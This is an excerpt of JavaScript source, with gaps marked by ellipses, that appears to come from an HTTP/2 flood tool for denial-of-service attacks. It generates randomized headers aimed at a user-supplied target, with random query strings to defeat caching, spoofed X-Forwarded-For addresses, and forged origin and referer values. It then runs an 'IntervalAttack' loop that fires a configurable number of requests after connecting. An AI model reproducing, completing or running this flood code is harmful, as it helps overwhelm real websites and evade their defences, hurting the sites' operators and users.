...
const origin_header = [
    "https://" + new url.URL(args.target).host,
    "null"
];
const rateHeaders = [
...
function generateHeaders() {
    return {
        ...
        ":path": parsedTarget.path + (parsedTarget.path.includes("?") ? "&" : "?") + randstr(randomIntn(5,10)) + "=" + randstr(randomIntn(3,8)),
        ":scheme": "https",
        ...
        "pragma": randomElement(pragma_header),
        "origin": randomElement(origin_header),
        "connection": randomElement(connection_header),
        "x-forwarded-proto": "https",
        "x-forwarded-host": parsedTarget.host,
        "x-forwarded-for": `${randomIntn(1,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}`,
        "referer": "https://" + parsedTarget.host + "/" + randstr(randomIntn(5,10))
    };
}
        ...
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynHeaders = Object.assign({}, generateHeaders(), randomElement(rateHeaders));
